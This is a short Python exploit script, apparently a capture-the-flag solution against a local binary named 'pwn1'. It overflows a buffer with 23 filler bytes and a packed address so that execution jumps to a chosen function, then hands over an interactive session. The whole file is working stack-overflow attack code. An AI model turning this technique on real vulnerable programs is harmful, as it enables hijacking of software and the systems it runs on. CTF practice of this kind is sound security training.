from kk import *

p = process("./pwn1")

f_addr = 0x401186

#GDB(p)
payload = b"A"*23 + p64(f_addr+1)
p.sendline(payload)

p.interactive()